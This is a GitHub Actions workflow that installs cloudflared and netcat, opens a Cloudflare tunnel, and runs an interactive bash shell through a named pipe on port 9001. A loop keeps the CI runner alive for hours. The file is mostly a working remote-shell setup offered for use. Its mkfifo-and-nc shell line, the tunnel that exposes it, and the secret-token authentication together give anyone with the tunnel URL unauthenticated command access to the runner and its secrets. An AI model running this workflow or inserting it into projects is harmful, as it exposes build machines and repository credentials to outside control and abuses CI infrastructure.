name: Cloudflare Tunnel and Reverse Shell

on:
  push:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - uses: actions/checkout@v4

      - name: Install Dependencies
        run: |
          sudo apt update
          sudo apt install -y wget unzip netcat-openbsd

      - name: Download cloudflared
        run: |
          wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
          sudo dpkg -i cloudflared-linux-amd64.deb

      - name: Authenticate cloudflared
        env:
          CLOUDFLARE_AUTH_TOKEN: ${{ secrets.CLOUDFLARE_AUTH_TOKEN }}
        run: |
          cloudflared tunnel login --token "$CLOUDFLARE_AUTH_TOKEN"

      - name: Create and Run Tunnel
        run: |
          cloudflared tunnel create github-actions-tunnel || true # Ignore if already exists
          TUNNEL_ID=$(cloudflared tunnel list | grep "github-actions-tunnel" | awk '{print $1}')
          echo "Tunnel ID: $TUNNEL_ID"
          cloudflared tunnel run $TUNNEL_ID --url tcp://localhost:9001 &
          echo "Cloudflare Tunnel running in the background..."
          sleep 10 # Give it some time to establish

      - name: Start Reverse Shell (Listening)
        run: |
          echo "=== Starting reverse shell (listening) ==="
          mkfifo /tmp/backpipe
          /bin/bash -i < /tmp/backpipe 2>&1 | nc -lvnp 9001 > /tmp/backpipe &
          sleep 5
          echo "=== Netcat is listening on port 9001 ==="
          echo "=== Check your Cloudflare Tunnel public URL to connect ==="
          echo "You can find the URL in your Cloudflare Dashboard under Access -> Tunnels -> github-actions-tunnel -> Public Hostnames (TCP tab)."
          # Keep workflow alive
          for i in {1..360}; do
            sleep 60
          done
